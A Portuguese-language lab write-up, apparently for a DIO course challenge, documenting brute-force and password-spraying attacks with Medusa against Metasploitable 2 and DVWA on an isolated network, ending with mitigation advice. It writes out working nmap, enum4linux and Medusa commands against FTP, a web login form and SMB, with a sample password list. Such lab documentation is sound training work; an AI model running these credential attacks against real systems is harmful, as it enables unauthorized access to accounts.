# **Simulação de Força Bruta em Ambiente Controlado (Kali + Metasploitable 2 + DVWA)** 

## Descrição 
Projeto desenvolvido para o desafio proposto pela DIO, utilizando Kali Linux como máquina atacante e Metasploitable 2 / DVWA como alvos vulneráveis, com o objetivo foi simular ataques de força bruta exclusivamente em laboratório isolado, aplicando técnicas de auditoria ética.

## Ambiente Utilizado
| Máquina        | Sistema        | IP            | Função                        |
|----------------|----------------|---------------|-------------------------------|
| Kali Linux     | Kali 2024.x    | 192.168.56.102 | Atacante                      |
| Metasploitable 2 | Linux vulnerável | 192.168.56.103 | Alvo (FTP/SMB)               |
| DVWA           | LAMP + DVWA    | 192.168.56.104 | Alvo Web                      |

Rede: Host-Only, isolada.
Conectividade:
```
ping 192.168.56.103
ping 192.168.56.104
```

## Ferramentas

- Medusa
- Nmap
- DVWA
- Wordlists simples

## Enumeração (Nmap)
```
nmap -sV 192.168.56.103
```

Serviços encontrados:
- FTP (21)
- SSH (22)
- SMB (139/445)

## Testes Realizados
1. Força Bruta no FTP

Wordlist:
```
admin
password
123456
senha123
msfadmin
```

Comando:
```
medusa -h 192.168.56.103 -u msfadmin -P wordlist.txt -M ftp
```

Resultado: credencial válida encontrada.

2. Força Bruta em Formulário Web (DVWA)

Parâmetros identificados:
```
username=^USER^&password=^PASS^&Login=Login
```

Comando:
```
medusa -h 192.168.56.104 -u admin -P wordlist.txt -M http -m FORM:"/DVWA/vulnerabilities/brute/":"username=^USER^&password=^PASS^&Login=Login"
```

Resultado: acesso obtido.

3. Password Spraying em SMB
Enumeração de usuários:
```
enum4linux -U 192.168.56.103
```

Spraying:
```
medusa -h 192.168.56.103 -U users.txt -p 123456 -M smbnt
```

Resultado: senha identificada para um dos usuários.

## Recomendações de Mitigação
- Senhas fortes e únicas
- Limite de tentativas / Fail2ban
- Desativar serviços inseguros (FTP, Telnet)
- Priorizar SSH/HTTPS
- Implementar MFA
- Monitorar logs de autenticação

## O que aprendi?
- Funcionamento interno do Medusa;
- Diferença entre brute force e password spraying;
- Importância da enumeração antes do ataque;
- Reconhecimento de vulnerabilidades comuns;
- Valor do ambiente isolado para práticas éticas;
- Boas práticas de documentação e mitigação.
